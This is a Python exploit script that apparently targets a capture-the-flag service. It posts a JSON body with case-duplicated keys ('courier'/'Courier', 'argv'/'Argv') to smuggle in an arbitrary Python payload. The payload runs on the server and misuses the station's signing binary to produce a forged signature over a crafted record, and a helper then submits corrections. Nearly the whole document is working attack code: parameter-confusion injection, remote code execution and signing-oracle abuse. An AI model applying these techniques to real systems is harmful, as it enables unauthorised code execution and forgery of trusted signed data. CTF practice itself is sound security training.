import base64, json, os, sys, requests

BASE = "http://w04.ctf.chronos-security.ro:33238"
A = "c-4a7f55"
L = "c-25cb7a"

SIGN_CODE = r'''
import os, base64
def q(v):
    return '"' + v.replace('\\', '\\\\').replace('"', '\\"') + '"'
fields = [
    ('applied_primary', 'false'),
    ('courier_id', q(os.environ['COURIER_ID'])),
    ('quay_id', q(os.environ['QUAY_ID'])),
    ('submission_id', q(os.environ['SUBMISSION_ID'])),
    ('warrant_id', q(os.environ['WARRANT_ID'])),
]
canon = ('{' + ','.join(q(k) + ':' + v for k, v in fields) + '}').encode()
import subprocess
sig = subprocess.run([os.environ['STATION_SIGN']], input=canon, capture_output=True)
sys = __import__('sys')
if sig.returncode != 0 or len(sig.stdout) != 64:
    print('SIGNFAIL', sig.returncode, len(sig.stdout), sig.stderr.decode('utf-8', 'replace'))
else:
    print('CANON', canon.decode())
    print('SIGB64', base64.b64encode(sig.stdout).decode())
'''


def new_submission():
    body = json.dumps({"courier": L, "argv": ["-c", SIGN_CODE], "Courier": A, "Argv": ["status"]})
    r = requests.post(BASE + "/v1/warrants", data=body, headers={"Content-Type": "application/json"}, timeout=60)
    j = r.json()
    print("warrant:", r.status_code, j.get("quay", {}).get("loader_status"))
    print(j.get("quay", {}).get("loader_stdout", "")[:2000])
    if j.get("quay", {}).get("loader_stderr"):
        print("STDERR", j["quay"]["loader_stderr"][:500])
    return j.get("submission_id"), j.get("quay", {}).get("loader_stdout", "")


def correction(payload):
    r = requests.post(BASE + "/v1/corrections", json=payload, timeout=30)
    print("correction:", r.status_code, r.text[:600])
    return r
